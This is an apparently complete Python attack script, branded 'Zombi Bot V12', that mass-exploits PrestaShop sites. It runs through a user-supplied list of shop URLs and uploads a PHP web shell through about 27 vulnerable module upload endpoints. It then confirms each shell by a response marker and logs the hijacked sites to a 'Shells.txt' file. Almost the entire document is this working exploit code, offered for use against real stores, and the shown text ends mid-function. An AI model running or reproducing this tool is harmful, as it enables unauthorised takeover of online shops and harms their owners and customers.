#!/usr/bin/python

# Coded By Viper 1337 
# Russian

import requests, re,urllib, urllib2, os, sys, codecs,binascii, json, argparse					
from multiprocessing.dummy import Pool					     	
from time import time as timer	
import time
from random import sample as rand
from Queue import Queue				   		
from platform import system
from urlparse import urlparse
from optparse import OptionParser	
from colorama import Fore								
from colorama import Style								
from pprint import pprint								
from colorama import init												
init(autoreset=True)
										
															
####### Colors	 ######	
	
fr  =   Fore.RED											
fc  =   Fore.CYAN											
fw  =   Fore.WHITE											
fg  =   Fore.GREEN											
sd  =   Style.DIM											
sn  =   Style.NORMAL										
sb  =   Style.BRIGHT										

####################### 
try:
    dork = raw_input("Write PrestaShop site list name \n")
    with codecs.open(dork, mode='r', encoding='ascii', errors='ignore') as f:
        ooo = f.read().splitlines()
except IOError:
    pass
ooo = list((ooo))



def banners():


	if system() == 'Linux':
		os.system('clear')
	if system() == 'Windows':
		os.system('cls')
		
		banner = """{}{} \n \n



		
                                                                
                                                                
                                                                
  ______               _     _   ____        _    __      ____ ___  
 |___  /              | |   (_) |  _ \      | |   \ \    / /_ |__ \ 
    / / ___  _ __ ___ | |__  _  | |_) | ___ | |_   \ \  / / | |  ) |
   / / / _ \| '_ ` _ \| '_ \| | |  _ < / _ \| __|   \ \/ /  | | / / 
  / /_| (_) | | | | | | |_) | | | |_) | (_) | |_     \  /   | |/ /_ 
 /_____\___/|_| |_| |_|_.__/|_| |____/ \___/ \__|     \/    |_|____|                                                                      
 Zombi Bot V12    |   Ultra Priv8 Bot    | |  Code by Viper1337                           
                                             
                      
 [+] ICQ: 744289868
									
   
    

		\n""".format(fc, sb)
		
		print banner
 

jceupshell = "ups/root.php"




Agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
user_agent = "Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3"


def rand_str (len = None) :
	if len == None :
		len = 8
	return ''.join (rand ('abcdefghijklmnopqrstuvwxyz', len))
	
def prepare(url, ua):
	try:
		global user_agent
		headers = {
			'User-Agent' : user_agent,
			'x-forwarded-for' : ua
		}
		cookies = urllib2.Request(url, headers=headers)
		result = urllib2.urlopen(cookies)
		cookieJar = result.info().getheader('Set-Cookie')
		injection = urllib2.Request(url, headers=headers)
		injection.add_header('Cookie', cookieJar)
		urllib2.urlopen(injection)
	except:
		pass
def toCharCode(string):
	try:
		encoded = ""
		for char in string:
			encoded += "chr({0}).".format(ord(char))
		return encoded[:-1]
	except:
		pass
def presbot(url):


	
    try:


		# 1 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/columnadverts/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/columnadverts/slides/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} columnadverts     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/columnadverts/slides/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/columnadverts/slides/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} columnadverts     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 2 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/vtemslideshow/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/vtemslideshow/slides/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} vtemslideshow     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/vtemslideshow/slides/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/vtemslideshow/slides/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} vtemslideshow     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 3 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/realty/include/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/realty/include/slides/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} realty     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/realty/include/slides/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/realty/include/slides/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} realty     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 4 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/realty/evogallery/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/realty/evogallery/slides/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} evogallery     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/realty/evogallery/slides/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/realty/evogallery/slides/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} evogallery     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 5 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/realty/evogallery2/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/realty/evogallery2/slides/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} evogallery2     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/realty/evogallery2/slides/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/realty/evogallery2/slides/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} evogallery2     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 6 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/resaleform/upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/filesupload/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} resaleform     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/filesupload/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/filesupload/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} resaleform     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 7 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/megaproduct/', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/megaproduct/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} megaproduct     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/megaproduct/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/megaproduct/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} megaproduct     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 8 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/soopamobile/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/soopamobile/slides/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} soopamobile     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/soopamobile/slides/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/soopamobile/slides/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} soopamobile     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 9 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/soopamobile2/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/soopamobile2/slides/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} soopamobile2     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/soopamobile2/slides/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/soopamobile2/slides/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} soopamobile2     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 10 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/soopamobile2/uploadproduct.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/soopamobile2/slides/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} soopamobile3     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/soopamobile2/slides/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/soopamobile2/slides/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} soopamobile3     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 11 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/soopabanners/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/soopabanners/slides/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} soopabanners     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/soopabanners/slides/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/soopabanners/slides/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} soopabanners     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 12 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/vtermslideshow/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/vtermslideshow/slides/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} vtermslideshow     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/vtermslideshow/slides/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/vtermslideshow/slides/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} vtermslideshow     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 13 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/simpleslideshow/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/simpleslideshow/slides/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} simpleslideshow     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/simpleslideshow/slides/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/simpleslideshow/slides/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} simpleslideshow     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 14 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/productpageadverts/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/productpageadverts/slides/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} productpageadverts     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/productpageadverts/slides/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/productpageadverts/slides/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} productpageadverts     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 15 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/homepageadvertise/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/homepageadvertise/slides/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} homepageadvertise     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/homepageadvertise/slides/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/homepageadvertise/slides/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} homepageadvertise     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 16 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/homepageadvertise2/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/homepageadvertise2/slides/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} homepageadvertise2     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/homepageadvertise2/slides/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/homepageadvertise2/slides/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} homepageadvertise2     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 17 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/columnadverts2/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/columnadverts2/slides/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} columnadverts2     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/columnadverts2/slides/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/columnadverts2/slides/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} columnadverts2     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 18 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/filesupload/upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/filesupload/uploads/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} filesupload     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/filesupload/uploads/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/filesupload/uploads/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} filesupload     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 19 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/jro_homepageadvertise/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/jro_homepageadvertise/slides/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} jro_homepageadvertise     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/jro_homepageadvertise/slides/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/jro_homepageadvertise/slides/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} jro_homepageadvertise     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 20 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/jro_homepageadvertise2/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/jro_homepageadvertise2/slides/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} jro_homepageadvertise2     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/jro_homepageadvertise2/slides/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/jro_homepageadvertise2/slides/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} jro_homepageadvertise2     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 21 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/leosliderlayer/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/leosliderlayer/slides/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} leosliderlayer     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/leosliderlayer/slides/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/mmodules/leosliderlayer/slides/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} leosliderlayer     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 22 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/leosliderlayer/upload_images.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/leosliderlayer/slides/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} leosliderlayer2     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/leosliderlayer/slides/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/leosliderlayer/slides/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} leosliderlayer2     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 23 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/vtemskitter/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/vtemskitter/img/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} vtemskitter     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/vtemskitter/img/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/vtemskitter/img/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} vtemskitter     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 24 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/additionalproductstabs/file_upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/additionalproductstabs/file_uploads/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} additionalproductstabs     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/additionalproductstabs/file_uploads/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/additionalproductstabs/file_uploads/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} additionalproductstabs     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 25 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/addthisplugin/file_upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/addthisplugin/file_uploads/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} addthisplugin     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/addthisplugin/file_uploads/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/addthisplugin/file_uploads/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} addthisplugin     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 26 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/attributewizardpro/file_upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/attributewizardpro/file_uploads/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} attributewizardpro     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/attributewizardpro/file_uploads/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/attributewizardpro/file_uploads/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} attributewizardpro     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 27 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/attributewizardpro.OLD/file_upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/attributewizardpro.OLD/file_uploads/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} attributewizardpro.OLD     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/attributewizardpro.OLD/file_uploads/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/attributewizardpro.OLD/file_uploads/root.php'+'\n')
			sys.exit()
		else:
